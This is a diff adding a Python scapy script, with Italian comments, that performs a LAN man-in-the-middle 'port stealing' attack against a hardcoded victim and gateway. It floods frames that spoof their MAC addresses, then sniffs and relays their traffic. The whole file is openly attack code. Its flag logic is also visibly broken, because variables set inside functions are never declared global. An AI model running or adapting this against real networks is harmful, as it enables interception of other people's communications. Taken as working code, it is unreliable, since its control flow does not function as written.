@@ -1,0 +1,77 @@
+from scapy.all import *
+from scapy.layers.inet import Ether, IP, TCP
+import time
+import threading
+
+gateway_mac='52:54:00:88:15:b6'
+victim_mac='08:00:27:24:32:1f'
+my_mac='70:4d:7b:3b:ca:f2'
+broadcast_mac='ff:ff:ff:ff:ff:ff'
+my_ip='192.168.20.184'
+gateway_ip='192.168.20.1'
+victim_ip='192.168.20.101'
+flag=0 #0 per pf; 1 per h
+flag_2=0
+
+def pacchetto_da_h(pckt):
+	#sniff_h.stop()
+	flag_2=1
+	chi_e_pf()
+	time.sleep(0.3)
+	sono_h()
+	sendp(pckt)
+	flag=1
+	sniff_pf.start()
+
+def pacchetto_da_pf(pckt):
+	#sniff_pf.stop()
+	flag_2=2
+	chi_e_h()
+	time.sleep(0.3)
+	sono_pf()
+	sendp(pckt)
+	flag=0
+	sniff_h.start()
+		
+def sono_pf():
+	for x in range(10):
+		print("arpizzo pf")
+		sendp(Ether(dst='ff:ff:ff:ff:ff:ff',src=gateway_mac)/IP(src=str(RandIP()),dst=str(RandIP()))/TCP(sport=2321,dport=23423,flags='R',options=[('Timestamp',(0,0))]))
+		time.sleep(0.5)
+def sono_h():
+	for x in range(10):
+		print("arpizzo h")
+		sendp(Ether(dst='ff:ff:ff:ff:ff:ff',src=victim_mac)/IP(src=str(RandIP()),dst=str(RandIP()))/TCP(sport=2321,dport=23423,flags='R',options=[('Timestamp',(0,0))]))
+		time.sleep(0.5)
+
+def chi_e_pf():
+	sendp(Ether(dst=broadcast_mac,src=my_mac)/ARP(op=1,psrc=my_ip,pdst=gateway_ip))
+
+def chi_e_h():
+	sendp(Ether(dst=broadcast_mac,src=my_mac)/ARP(op=1,psrc=my_ip,pdst=victim_ip))
+
+
+#while 1:
+#	sniff(lfilter=lambda d: (d.dst==gateway_mac and d.src==victim_mac) or (d.dst==victim_mac and d.src==gateway_mac), prn=sniffed)
+
+sniff_h=AsyncSniffer(lfilter=lambda d: (d.dst==gateway_mac and d.src==victim_mac), prn=pacchetto_da_h)
+sniff_pf=AsyncSniffer(lfilter=lambda d: (d.src==gateway_mac and d.dst==victim_mac), prn=pacchetto_da_pf)
+sniff_h.start()
+while 1:
+	if flag==0:
+		sono_pf()
+	else:
+		sono_h()
+	if flag_2==1:
+		sniff_h.stop()
+		print("Sniff di h stoppato")
+		flag_2=0
+	elif flag_2==2:
+		sniff_pf.stop()
+		print("Sniff di pf stoppato")
+		flag_2=0
+	time.sleep(0.5)
+
+
+
+
